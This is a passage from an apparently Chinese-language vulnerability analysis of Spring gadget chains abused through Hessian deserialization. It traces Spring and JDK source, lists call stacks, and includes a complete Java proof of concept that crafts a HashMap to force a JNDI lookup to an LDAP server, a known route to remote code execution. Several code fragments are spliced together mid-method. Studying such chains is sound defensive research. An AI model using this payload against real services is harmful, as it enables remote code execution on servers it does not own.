        else if (obj2 instanceof XNodeSet)
          return obj2.equals(this);
        else if(obj2 instanceof XNumber)
            return obj2.equals(this);
        else
          return str().equals(obj2.toString());
      }
      public String toString() {
                StringBuilder sb = new StringBuilder();
                Advice advice = this.advisor.getAdvice();
                sb.append(ClassUtils.getShortName(advice.getClass()));
                sb.append(": ");
                if (this.advisor instanceof Ordered) {
                    sb.append("order ").append(((Ordered)this.advisor).getOrder()).append(", ");
                }
    public int getOrder() {
        return this.order != null ? this.order : this.advice.getOrder();
    }
    public int getOrder() {
        return this.aspectInstanceFactory.getOrder();
    }
    public int getOrder() {
        Class type = this.beanFactory.getType(this.name);
        if (type != null) {
            return Ordered.class.isAssignableFrom(type) && this.beanFactory.isSingleton(this.name) ? ((Ordered)this.beanFactory.getBean(this.name)).getOrder() : OrderUtils.getOrder(type, 2147483647);
        } else {
            return 2147483647;
        }
    }
    public Class getType(String name) throws NoSuchBeanDefinitionException {
        try {
            return this.doGetType(name);
        } catch (NameNotFoundException var3) {
            throw new NoSuchBeanDefinitionException(name, "not found in JNDI environment");
        } catch (NamingException var4) {
            return null;
        }
    }
     private Class doGetType(String name) throws NamingException {
            if (this.isSingleton(name)) {
                Object jndiObject = this.doGetSingleton(name, (Class)null);
                return jndiObject != null ? jndiObject.getClass() : null;
     private  T doGetSingleton(String name, Class requiredType) throws NamingException {
            synchronized(this.singletonObjects) {
                Object jndiObject;
                if (this.singletonObjects.containsKey(name)) {
                    jndiObject = this.singletonObjects.get(name);
                    if (requiredType != null && !requiredType.isInstance(jndiObject)) {
                        throw new TypeMismatchNamingException(this.convertJndiName(name), requiredType, jndiObject != null ? jndiObject.getClass() : null);
                    } else {
                        return jndiObject;
                    }
                } else {
                    jndiObject = this.lookup(name, requiredType);
                    this.singletonObjects.put(name, jndiObject);
                    return jndiObject;
                }
            }
        }
到了该位置调用`this.lookup(name, requiredType);`
      protected  T lookup(String jndiName, Class requiredType) throws NamingException {
            Assert.notNull(jndiName, "'jndiName' must not be null");
            String convertedName = this.convertJndiName(jndiName);
            Object jndiObject;
            try {
                jndiObject = this.getJndiTemplate().lookup(convertedName, requiredType);
    public  T lookup(String name, Class requiredType) throws NamingException {
        Object jndiObject = this.lookup(name);
        if (requiredType != null && !requiredType.isInstance(jndiObject)) {
            throw new TypeMismatchNamingException(name, requiredType, jndiObject != null ? jndiObject.getClass() : null);
    public Object lookup(final String name) throws NamingException {
            if (this.logger.isDebugEnabled()) {
                this.logger.debug("Looking up JNDI object with name [" + name + "]");
            }
            return this.execute(new JndiCallback() {
     public  T execute(JndiCallback contextCallback) throws NamingException {
            Context ctx = this.getContext();
            Object var3;
            try {
                var3 = contextCallback.doInContext(ctx);
            } finally {
                this.releaseContext(ctx);
            }
            return var3;
        }
该位置获取InitialContext对象，传递到`var3 = contextCallback.doInContext(ctx);`方法进行继续调用
     public Object doInContext(Context ctx) throws NamingException {
                    Object located = ctx.lookup(name);
                    if (located == null) {
                        throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
                    } else {
                        return located;
                    }
至此触发漏洞，该链比较长
**调用栈**
    lookup:417, InitialContext (javax.naming)
    doInContext:155, JndiTemplate$1 (org.springframework.jndi)
    execute:87, JndiTemplate (org.springframework.jndi)
    lookup:152, JndiTemplate (org.springframework.jndi)
    lookup:179, JndiTemplate (org.springframework.jndi)
    lookup:95, JndiLocatorSupport (org.springframework.jndi)
    doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)
    doGetType:226, SimpleJndiBeanFactory (org.springframework.jndi.support)
    getType:191, SimpleJndiBeanFactory (org.springframework.jndi.support)
    getOrder:127, BeanFactoryAspectInstanceFactory (org.springframework.aop.aspectj.annotation)
    getOrder:216, AbstractAspectJAdvice (org.springframework.aop.aspectj)
    getOrder:80, AspectJPointcutAdvisor (org.springframework.aop.aspectj)
    toString:151, AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder (org.springframework.aop.aspectj.autoproxy)
    equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    equals:104, HotSwappableTargetSource (org.springframework.aop.target)
    putVal:635, HashMap (java.util)
    put:612, HashMap (java.util)
    readMap:114, MapDeserializer (com.caucho.hessian.io)
    readMap:538, SerializerFactory (com.caucho.hessian.io)
    readObject:2110, Hessian2Input (com.caucho.hessian.io)
    main:87, SpringPartiallyComparableAdvisorHoldertest
###  SpringAbstractBeanFactoryPointcutAdvisor
**构造分析**
    default Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        return SpringUtil.makeBeanFactoryTriggerBFPA(uf, jndiUrl, SpringUtil.makeJNDITrigger(jndiUrl));
    }
    public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }
    public static Object makeBeanFactoryTriggerBFPA ( UtilFactory uf, String name, BeanFactory bf ) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(name);
        return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
    }
和前面差不多，再次不多做分析
**利用分析**
**poc**
    import com.caucho.hessian.io.Hessian2Input;
    import com.caucho.hessian.io.Hessian2Output;
    import marshalsec.HessianBase;
    import marshalsec.util.Reflections;
    import org.apache.commons.logging.impl.NoOpLog;
    import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
    import org.springframework.jndi.support.SimpleJndiBeanFactory;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.lang.reflect.Array;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    public class SpringAbstractBeanFactoryPointcutAdvisortest {
        public static void main(String[] args) throws Exception {
            String jndiUrl = "ldap://localhost:1389/obj";
            SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
            bf.setShareableResources(jndiUrl);
            Reflections.setFieldValue(bf, "logger", new NoOpLog());
            Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    //        bf
            DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
            pcadv.setBeanFactory(bf);
            pcadv.setAdviceBeanName(jndiUrl);
            HashMap s = new HashMap<>();
            Reflections.setFieldValue(s, "size", 2);
            Class nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            }
            catch ( ClassNotFoundException e ) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, pcadv, pcadv, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, new DefaultBeanFactoryPointcutAdvisor(), new DefaultBeanFactoryPointcutAdvisor(), null));
            Reflections.setFieldValue(s, "table", tbl);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
            HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            hessian2Output.setSerializerFactory(sf);
            hessian2Output.writeObject(s);
            hessian2Output.flushBuffer();
            byte[] bytes = byteArrayOutputStream.toByteArray();
            // hessian2反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
            Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
            HashMap o = (HashMap) hessian2Input.readObject();
    //        pcadv, new DefaultBeanFactoryPointcutAdvisor();
        }
    }
断点依旧打在`MapDeserializer`中，调用put方法，跟踪
       public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
    final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                       boolean evict) {
            Node[] tab; Node p; int n, i;
            if ((tab = table) == null || (n = tab.length) == 0)
                n = (tab = resize()).length;
            if ((p = tab[i = (n - 1) & hash]) == null)
                tab[i] = newNode(hash, key, value, null);
            else {
                Node e; K k;
                if (p.hash == hash &&
                    ((k = p.key) == key || (key != null && key.equals(k))))
    public boolean equals(Object other) {
        if (this == other) {
            return true;
        } else if (!(other instanceof PointcutAdvisor)) {
            return false;
        } else {
            PointcutAdvisor otherAdvisor = (PointcutAdvisor)other;
            return ObjectUtils.nullSafeEquals(this.getAdvice(), otherAdvisor.getAdvice()) && ObjectUtils.nullSafeEquals(this.getPointcut(), otherAdvisor.getPointcut());
        }
    }
    public Advice getAdvice() {
        Advice advice = this.advice;
        if (advice == null && this.adviceBeanName != null) {
            Assert.state(this.beanFactory != null, "BeanFactory must be set to resolve 'adviceBeanName'");
            if (this.beanFactory.isSingleton(this.adviceBeanName)) {
                advice = (Advice)this.beanFactory.getBean(this.adviceBeanName, Advice.class);
这条链是借助调用getbean
    public  T getBean(String name, Class requiredType) throws BeansException {
        try {
            return this.isSingleton(name) ? this.doGetSingleton(name, requiredType) : this.lookup(name, requiredType);
     private  T doGetSingleton(String name, Class requiredType) throws NamingException {
            synchronized(this.singletonObjects) {
                Object jndiObject;
                if (this.singletonObjects.containsKey(name)) {
                    jndiObject = this.singletonObjects.get(name);
                    if (requiredType != null && !requiredType.isInstance(jndiObject)) {
                        throw new TypeMismatchNamingException(this.convertJndiName(name), requiredType, jndiObject != null ? jndiObject.getClass() : null);
                    } else {
                        return jndiObject;
                    }
                } else {
                    jndiObject = this.lookup(name, requiredType);
                    this.singletonObjects.put(name, jndiObject);
                    return jndiObject;
                }
            }
        }
     protected  T lookup(String jndiName, Class requiredType) throws NamingException {
            Assert.notNull(jndiName, "'jndiName' must not be null");
            String convertedName = this.convertJndiName(jndiName);
            Object jndiObject;
            try {
                jndiObject = this.getJndiTemplate().lookup(convertedName, requiredType);
     public  T lookup(String name, Class requiredType) throws NamingException {
            Object jndiObject = this.lookup(name);
    ublic Object lookup(final String name) throws NamingException {
            if (this.logger.isDebugEnabled()) {
                this.logger.debug("Looking up JNDI object with name [" + name + "]");
            }
            return this.execute(new JndiCallback() {
                public Object doInContext(Context ctx) throws NamingException {
                    Object located = ctx.lookup(name);
                    if (located == null) {
                        throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
                    } else {
                        return located;
                    }
                }
            });
        }
     public  T execute(JndiCallback contextCallback) throws NamingException {
            Context ctx = this.getContext();
            Object var3;
            try {
                var3 = contextCallback.doInContext(ctx);
            } finally {
                this.releaseContext(ctx);
            }
            return var3;
        }
    public Object lookup(final String name) throws NamingException {
            if (this.logger.isDebugEnabled()) {
                this.logger.debug("Looking up JNDI object with name [" + name + "]");
            }
            return this.execute(new JndiCallback() {
                public Object doInContext(Context ctx) throws NamingException {
                    Object located = ctx.lookup(name);
                    if (located == null) {
                        throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
                    } else {
                        return located;
                    }
                }
            });
        }
**调用栈**
    lookup:417, InitialContext (javax.naming)
    doInContext:155, JndiTemplate$1 (org.springframework.jndi)
    execute:87, JndiTemplate (org.springframework.jndi)
    lookup:152, JndiTemplate (org.springframework.jndi)
    lookup:179, JndiTemplate (org.springframework.jndi)
    lookup:95, JndiLocatorSupport (org.springframework.jndi)
    doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)
    getBean:112, SimpleJndiBeanFactory (org.springframework.jndi.support)
    getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)
    equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)
    putVal:635, HashMap (java.util)
    put:612, HashMap (java.util)
    readMap:114, MapDeserializer (com.caucho.hessian.io)
    readMap:538, SerializerFactory (com.caucho.hessian.io)
    readObject:2110, Hessian2Input (com.caucho.hessian.io)
    main:59, SpringAbstractBeanFactoryPointcutAdvisortest
## 0x04 漏洞分析
###  CVE-2019-17564 漏洞分析
**影响版本**